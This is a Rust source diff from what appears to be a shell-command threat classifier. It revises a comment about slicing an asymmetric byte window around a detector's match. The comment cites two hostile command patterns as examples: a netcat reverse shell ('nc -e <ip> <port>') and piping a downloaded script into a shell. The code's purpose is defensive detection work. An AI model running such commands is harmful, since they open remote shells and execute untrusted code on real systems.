@@ -130,10 +130,14 @@ mod with_tract {
         fn infer_with_hint(&self, command: &str, hint_offset: Option<usize>) -> Result<[f32; 3], String> {
             // V2-H sliding-context-window. When an upstream Tier-1
             // matcher (AtomMatcher / regex / flagged-URL) reported
-            // a localised hit, we slice [-64, +256] chars around it
-            // and tokenise ONLY that window. Drops 3-5× tokens on
-            // long pipeline-stuffed commands; the SLM still gets
-            // enough surrounding context to disambiguate.
+            // a localised hit, we slice [-64, +256] BYTES around the
+            // start-of-match offset and tokenise ONLY that window.
+            // The window is asymmetric (more after than before) on
+            // purpose: payload typically follows the matched atom
+            // (e.g. `nc -e <ip> <port>`, `curl -fsSL <url> | sh`).
+            // Drops 3-5× tokens on long pipeline-stuffed commands;
+            // the SLM still gets enough surrounding context to
+            // disambiguate.
             //
             // No hint = tokenise the whole command (current
             // behaviour). Used when the Tier-2 backend is called
